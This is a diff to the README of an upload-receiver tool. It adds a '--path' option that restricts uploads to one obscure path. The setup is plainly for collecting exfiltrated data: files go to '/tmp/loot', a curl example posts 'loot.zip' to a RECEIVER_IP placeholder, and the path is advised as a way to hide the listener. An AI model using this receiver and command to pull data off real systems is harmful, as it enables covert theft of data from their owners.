@@ -42,6 +42,7 @@ $ python3 upload_server.py --bind 0.0.0.0 --port 8443 --dir /tmp/loot \
 | `--overwrite` | off | Overwrite existing files instead of adding a numeric suffix |
 | `--token` | none (disabled) | Require this bearer token on every request |
 | `--hash` | off | Compute and return a SHA-256 digest of each upload |
+| `--path` | `/` | Only accept uploads POSTed to this path; other paths get `404` |
 
 Send a file as the raw request body:
 
@@ -122,12 +123,29 @@ SHA-256: 3a7bd3e2360a3d...
 With `?format=json` the digest is returned as a `sha256` field instead.
 Hashing is skipped entirely unless `--hash` is passed.
 
+By default any path accepts uploads (`POST /`, `POST /whatever`, etc. all
+work identically). Pass `--path` to restrict uploads to a single, specific
+path — useful alongside `--token` to make the listener harder to stumble
+onto, or in combination with a hard-to-guess path segment:
+
+```console
+$ python3 upload_server.py --path /drop-3f9a1c
+
+$ curl --data-binary @loot.zip "http://RECEIVER_IP:8000/drop-3f9a1c?name=loot.zip"
+```
+
+Requests to any other path get `404`, same as an unknown `GET` path. This
+check runs after the (optional) auth check but before anything else, so a
+POST to the wrong path never touches disk. `GET /health` is unaffected by
+`--path` and always stays available for readiness checks.
+
 Press `Ctrl-C` in the receiver terminal to stop the server.
 
 ## Current behavior and limitations
 
-- POST saves a file; `GET /health` reports the running configuration; any
-  other path or method returns `404`.
+- POST saves a file at the configured upload path (`/` by default); `GET
+  /health` reports the running configuration; any other path or method
+  returns `404`.
 - Authentication is optional and off unless `--token` is passed; there is no
   encryption, so a bearer token is only as safe as the network it crosses.
 - The request body is treated as opaque binary data; multipart form uploads
